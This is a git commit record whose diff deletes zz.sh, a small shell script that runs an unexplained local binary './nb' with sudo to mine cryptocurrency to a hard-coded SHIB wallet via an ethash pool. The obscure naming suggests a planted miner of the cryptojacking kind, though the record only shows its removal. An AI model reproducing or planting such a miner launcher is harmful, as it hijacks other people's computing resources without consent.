68dce494374a7db14304b4a5757f8f3c237170b5
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-06-30 10:39:38 +0700

    Delete zz.sh

--- zz.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=SHIB:0x1bfbd41ec85709c80bd3d5790bc22ba8a12b0836
-WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-lgk#w3o2-bj87)
-
-cd "$(dirname "$0")"
-
-chmod +x ./nb && sudo ./nb -a ethash -o  $POOL -u $WALLET.$WORKEER $@
